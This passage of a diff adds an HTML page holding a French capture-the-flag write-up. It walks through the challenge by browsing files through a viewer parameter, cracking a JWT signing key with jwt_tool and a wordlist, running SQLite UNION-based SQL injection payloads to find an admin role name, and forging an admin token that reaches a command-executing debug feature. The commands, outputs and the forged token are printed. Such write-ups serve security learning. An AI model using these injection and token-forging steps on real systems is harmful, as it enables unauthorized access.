+                <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Ingredient invalide.&lt;/p&gt;&quot;</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="cp">?&gt;</span>
+<span class="x">    &lt;/div&gt;</span>
+<span class="x">&lt;/div&gt;</span>
+<span class="x">&lt;/body&gt;</span>
+<span class="x">&lt;/html&gt;</span>
+</pre></div>
+</div>
+<p>Les autres fichiers sont inaccessible, on peut tout même trouver l’ingrédient secret mais résultat : <a class="reference external" href="http://57.128.112.118:10570/?dir=%2Fsecrets&amp;file=ingr%C3%A9dient+secret">http://57.128.112.118:10570/?dir=%2Fsecrets&amp;file=ingr%C3%A9dient+secret</a></p>
+<p>« OH LE BAIT AHAHA… »</p>
+<p>Jamais je ne mettrai mon ingredient secret dans un fichier visible comme ca.</p>
+<p>signe Jonathan le stagiaire »</p>
+<p>Donc on a besoin de la clé jwt pour forger un token admin et utiliser la fonctionnalité debug qui exécute des commandes.</p>
+<p>On va cracker la clé du JWT avec jwt_tool et rockyou :</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">python3 jwt_tool -C -d rockyou.txt &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoic2ltcGxlLXV0aWxpc2F0ZXVyIn0.0jureYiNTgso9kOqPJoouKMhJmPg8fTZ1Lm0NPKIINM&quot;</span>
+</pre></div>
+</div>
+<p>On obtient le mot de passe « icecream »</p>
+<p>On peut donc forger un nouveau token.</p>
+<p>Cependant cela ne fonctionne pas avec :</p>
+<ul class="simple">
+<li><p>role = admin</p></li>
+<li><p>role = administrateur</p></li>
+<li><p>role = administrator</p></li>
+<li><p>role = papi</p></li>
+<li><p>role = simple-admin</p></li>
+<li><p>role = simple-administrateur</p></li>
+</ul>
+<p>Il faut qu’on trouve exactement ce que contient le token admin pour avoir exactement le même.</p>
+<p>En faites si on se rend sur : <a class="reference external" href="http://57.128.112.118:10570/?dir=%2F&amp;file=auth.php">http://57.128.112.118:10570/?dir=%2F&amp;file=auth.php</a></p>
+<p>On a alors un formulaire qui va nous permettre de trouver le bon rôle, probablement via une injection SQL</p>
+<p>Caractère interdits : = «  0 ( ) *</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">1&#39; UNION SELECT version --</span>
+<span class="go">SQLite3::query(): Unable to prepare statement: 1, no such column: version in /var/www/html/auth.php on line 21</span>
+<span class="go">Database Error: no such column: version</span>
+
+<span class="go">1&#39; UNION SELECT sql from sqlite_schema --</span>
+<span class="go">CREATE TABLE &quot;auth&quot; ( id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(255) NOT NULL ) est un type d&#39;auth</span>
+
+<span class="go">1&#39; UNION SELECT name from auth --</span>
+<span class="go">PAPI-JE-SUIS-UN-ADMIN est un type d&#39;auth.</span>
+<span class="go">client est un type d&#39;auth.</span>
+<span class="go">simple-utilisateur est un type d&#39;auth.</span>
+</pre></div>
+</div>
+<p>Il faut donc faire role = PAPI-JE-SUIS-UN-ADMIN</p>
+<p>On le fait avec jwt_tool comme d’habitude</p>
+<p>Pourtant cela ne fonctionne pas malgré l’utilisation de jwt_tool pour modifier et resigner le token.</p>
+<p>Finalement il y avait un problème dans le challenge, on garde notre cookie de coté :</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiUEFQSS1KRS1TVUlTLVVOLUFETUlOIn0.-nbupCaKoUpMjBNbrGRj904w1mJKwrCcQ2uLAGWgTlc</span>
+</pre></div>
+</div>
+<p>Une fois le challenge modifié on peut l’utiliser pour obtenir le flag via la fonction debug, le fichier est caché dans le dossiers « secrets »</p>
+<p>Flag : pas noté</p>
+</section>
+
+
+           </div>
+          </div>
+          <footer><div class="rst-footer-buttons" role="navigation" aria-label="Pied de page">
+        <a href="formavility.html" class="btn btn-neutral float-left" title="Form Avility" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left" aria-hidden="true"></span> Précédent</a>
+        <a href="localterror.html" class="btn btn-neutral float-right" title="Local Terror" accesskey="n" rel="next">Suivant <span class="fa fa-arrow-circle-right" aria-hidden="true"></span></a>
+    </div>
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>&#169; Droits d'auteur 2025, Kubow.</p>
+  </div>
+
+  Compilé avec <a href="https://www.sphinx-doc.org/">Sphinx</a> en utilisant un
+    <a href="https://github.com/readthedocs/sphinx_rtd_theme">thème</a>
+    fourni par <a href="https://readthedocs.org">Read the Docs</a>.
+   
+
+</footer>
+        </div>
+      </div>
+    </section>
+  </div>
+  <script>
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
